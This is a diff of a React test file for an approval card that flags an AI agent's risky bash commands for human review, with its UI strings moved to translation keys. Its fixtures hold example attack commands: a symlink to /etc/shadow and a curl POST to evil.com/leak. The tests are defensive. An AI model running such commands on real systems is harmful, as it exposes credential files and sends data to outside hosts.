@@ -4,15 +4,23 @@ import { render, screen } from '@testing-library/react';
 import { PolymorphicApprovalCard } from '../PolymorphicApprovalCard';
 import type { ApprovalPayload } from '@/store/useApprovalStore';
 
-const stableT = (key: string) => {
-  if (key === 'approve') {
-    return 'Approve';
-  }
-  if (key === 'reject') {
-    return 'Reject';
-  }
-  return key;
-};
+const KNOWN_ESCALATION_REASONS = new Set(['symlink_creation', 'network_egress']);
+
+const stableT = Object.assign(
+  (key: string) => {
+    if (key === 'approve') {
+      return 'Approve';
+    }
+    if (key === 'reject') {
+      return 'Reject';
+    }
+    return key;
+  },
+  {
+    has: (key: string) =>
+      key.startsWith('escalationReasons.') && KNOWN_ESCALATION_REASONS.has(key.slice('escalationReasons.'.length)),
+  },
+);
 
 vi.mock('next-intl', () => ({
   useTranslations: () => stableT,
@@ -61,13 +69,13 @@ describe('PolymorphicApprovalCard Bash AST Capability Escalations', () => {
     render(<PolymorphicApprovalCard approval={approval} onResolve={mockOnResolve} isSubmitting={false} />);
 
     // Escalation alert container
-    expect(screen.getByText('检测到敏感能力边界申请')).toBeDefined();
+    expect(screen.getByText('escalationTitle')).toBeDefined();
 
     // Specific chips and labels
-    expect(screen.getByText(/创建符号链接 \(Symlink\)/)).toBeDefined();
+    expect(screen.getByText(/escalationReasons\.symlink_creation/)).toBeDefined();
     expect(screen.getByText('ln -s /etc/shadow ./shadow_link')).toBeDefined();
 
-    expect(screen.getByText(/外部网络连接 \(Network Egress\)/)).toBeDefined();
+    expect(screen.getByText(/escalationReasons\.network_egress/)).toBeDefined();
     expect(screen.getByText('curl -X POST https://evil.com/leak')).toBeDefined();
   });
 
@@ -94,6 +102,35 @@ describe('PolymorphicApprovalCard Bash AST Capability Escalations', () => {
 
     render(<PolymorphicApprovalCard approval={approval} onResolve={mockOnResolve} isSubmitting={false} />);
 
-    expect(screen.queryByText('检测到敏感能力边界申请')).toBeNull();
+    expect(screen.queryByText('escalationTitle')).toBeNull();
+  });
+
+  it('shows unknown escalation reasons verbatim and falls back for a missing reason', () => {
+    const approval: ApprovalPayload = {
+      approval_id: 'app_escalation_3',
+      user_id: 'usr_1',
+      action_type: 'subagent_approval',
+      status: 'pending',
+      severity: 'high',
+      payload: {
+        tool_calls: [
+          {
+            name: 'bash_code_execute_tool',
+            args: {
+              command: 'mystery --flag',
+              escalations: [
+                { command: 'mystery --flag', base_cmd: 'mystery', reason: 'brand_new_reason', details: '' },
+                { command: 'other', base_cmd: 'other', reason: '', details: '' },
+              ],
+            },
+          },
+        ],
+      },
+    };
+
+    render(<PolymorphicApprovalCard approval={approval} onResolve={vi.fn()} isSubmitting={false} />);
+
+    expect(screen.getByText(/brand_new_reason/)).toBeDefined();
+    expect(screen.getByText(/escalationFallbackReason/)).toBeDefined();
   });
 });
